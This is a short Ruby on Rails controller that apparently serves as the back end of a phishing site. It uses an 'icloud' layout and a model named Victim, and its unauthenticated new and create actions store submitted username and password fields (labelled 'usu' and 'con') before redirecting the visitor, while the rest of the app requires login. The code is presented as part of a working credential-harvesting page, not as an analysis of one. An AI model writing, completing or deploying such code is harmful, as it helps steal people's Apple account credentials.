class VictimsController < ApplicationController
	layout "icloud"
	 before_action :authenticate_user!, except: [:new,:create,:movil]
	def mobile_device?
	   if session[:mobile_param]
	     session[:mobile_param] == "1"
	   else
	     request.user_agent =~ /Mobile|webOS/
	   end
	end
	def new 
		@V= Victim.new
	end

	def create
		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
		redirect_to root_path
	end
end
